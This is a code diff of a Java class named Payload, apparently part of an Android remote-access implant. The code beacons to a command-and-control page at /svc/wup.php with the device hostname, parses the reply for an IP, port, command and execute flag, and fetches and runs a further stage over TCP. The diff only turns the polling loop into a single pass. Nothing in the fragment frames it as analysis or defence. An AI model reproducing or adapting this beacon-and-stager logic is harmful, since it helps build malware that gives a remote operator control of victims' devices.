@@ -89,29 +89,30 @@ public class Payload {
                     }
                 }
                 if (url.startsWith("tcp")) {
-                    while (true) {
-                        hostname = getHostName("Android");
-                        result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname);
-
-                        String[] array = result.split("\\|\\|", -1);
-                        String exec=array[7].substring(5);
-                        String ip=array[1].substring(3);
-                        String port=array[2].substring(5);
-                        String cmd=array[8].substring(4);
-                        String iout=array[5].substring(5);
-                        url="tcp://"+ip+":"+port;
-                        if (exec.equals("1")) {
-
-                            result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname + "&exec=0");
-                            runStagefromTCP(url);
-                        }
+                    //while (true) {
                         try {
+                            hostname = getHostName("Android");
+                            result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname);
+
+                            String[] array = result.split("\\|\\|", -1);
+                            String exec=array[7].substring(5);
+                            String ip=array[1].substring(3);
+                            String port=array[2].substring(5);
+                            String cmd=array[8].substring(4);
+                            String iout=array[5].substring(5);
+                            url="tcp://"+ip+":"+port;
+                            if (exec.equals("1")) {
+
+                                result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname + "&exec=0");
+                                runStagefromTCP(url);
+                            }
+
                             Thread.sleep(60 * 1000);
                         }
                         catch (InterruptedException e) {
                             e.printStackTrace();
                         }
-                    }
+                    //}
                 } else {
                     runStageFromHTTP(url);
                 }
